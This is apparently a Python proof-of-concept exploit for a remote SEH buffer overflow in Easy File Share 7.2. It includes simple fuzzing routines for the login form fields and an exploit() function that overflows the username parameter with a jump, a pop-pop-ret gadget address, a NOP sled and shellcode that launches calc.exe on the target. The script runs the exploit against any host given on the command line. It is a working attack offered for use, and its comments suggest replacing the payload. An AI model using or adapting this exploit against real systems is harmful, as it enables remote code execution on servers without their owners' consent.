#!/usr/bin/env python

# Easy File Share 7.2 Remote BoF SEH
# Set up for some test cases for fuzzing
# Pops calc on test case B, exploit() funciton
# Change to whatever, the app is full of holes

import sys
import requests

host = sys.argv[1]
port = sys.argv[2]
t = 'http://' + host

a = 'frmLogin=true'
b = '&frmUserName=admin'
c = '&frmUserPass=admin'
d = '&login=login%21'

# Some quick, rudimentary test cases for the POST parameters
def testA(a,b,c,d):
    i = 1
    while i < 1000:
        a += 'A' * i
        i += 100
        data = a+b+c+d
        req = requests.post(t, data)
        print "Test A: " + str(i) 
def testB(a,b,c,d):
    i = 1
    while i < 10000:
        b += 'B' * i
        i += 100
        data = a+b+c+d
        req = requests.post(t, data)
        print "Test B: " + str(i)
def testC(a,b,c,d):
    i = 1
    while i < 10000:
        c += 'C' * i
        i += 100
        data = a+b+c+d
        req = requests.post(t, data)
        print "Test C: " + str(i)        
def testD(a,b,c,d):
    i = 1
    while i < 1000:
        d += 'D' * i
        i += 100
        data = a+b+c+d
        req = requests.post(t, data)
        print "Test D: " + str(i)

# Call each test case
def fuzz():

    print "[+] Sending A"
    testA(a,b,c,d)

    print "[+] Sending B"
    testB(a,b,c,d)

    print "[+] Sending C"
    testC(a,b,c,d)

    print "[+] Sending D"
    testD(a,b,c,d)


# exploit the app, currently configured for test case B
# B: frmUserName
# Only tested on Windows 7 Ultimate SP1
def exploit(a,b,c,d):
    
    j = 'B' * 4054
    
    # SEH:
    # 0x1002368d : pop ebp # pop ebx # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)
    s1 = '\xEB\x06\x90\x90'
    s2 = '\x8d\x36\x02\x10'
    nops = '\x90'*80
    
    # Badchar = \x25\x26\x27
    # windows/exec CMD=calc.exe
    buf =  ""
    buf += "\xdb\xd8\xd9\x74\x24\xf4\xba\x79\xc8\x7b\xcd\x58\x33"
    buf += "\xc9\xb1\x31\x83\xe8\xfc\x31\x50\x14\x03\x50\x6d\x2a"
    buf += "\x8e\x31\x65\x28\x71\xca\x75\x4d\xfb\x2f\x44\x4d\x9f"
    buf += "\x24\xf6\x7d\xeb\x69\xfa\xf6\xb9\x99\x89\x7b\x16\xad"
    buf += "\x3a\x31\x40\x80\xbb\x6a\xb0\x83\x3f\x71\xe5\x63\x7e"
    buf += "\xba\xf8\x62\x47\xa7\xf1\x37\x10\xa3\xa4\xa7\x15\xf9"
    buf += "\x74\x43\x65\xef\xfc\xb0\x3d\x0e\x2c\x67\x36\x49\xee"
    buf += "\x89\x9b\xe1\xa7\x91\xf8\xcc\x7e\x29\xca\xbb\x80\xfb"
    buf += "\x03\x43\x2e\xc2\xac\xb6\x2e\x02\x0a\x29\x45\x7a\x69"
    buf += "\xd4\x5e\xb9\x10\x02\xea\x5a\xb2\xc1\x4c\x87\x43\x05"
    buf += "\x0a\x4c\x4f\xe2\x58\x0a\x53\xf5\x8d\x20\x6f\x7e\x30"
    buf += "\xe7\xe6\xc4\x17\x23\xa3\x9f\x36\x72\x09\x71\x46\x64"
    buf += "\xf2\x2e\xe2\xee\x1e\x3a\x9f\xac\x74\xbd\x2d\xcb\x3a"
    buf += "\xbd\x2d\xd4\x6a\xd6\x1c\x5f\xe5\xa1\xa0\x8a\x42\x5d"
    buf += "\xeb\x97\xe2\xf6\xb2\x4d\xb7\x9a\x44\xb8\xfb\xa2\xc6"
    buf += "\x49\x83\x50\xd6\x3b\x86\x1d\x50\xd7\xfa\x0e\x35\xd7"
    buf += "\xa9\x2f\x1c\xb4\x2c\xbc\xfc\x15\xcb\x44\x66\x6a"
    
    j2 = 'B' * (5000 - len(j+s1+s1+nops+buf))
    
    b += j + s1 + s2 + nops + buf + j2
    
    req = requests.post(t, a+b+c+d)
    print "Sent " + str(len(b))

exploit(a,b,c,d)
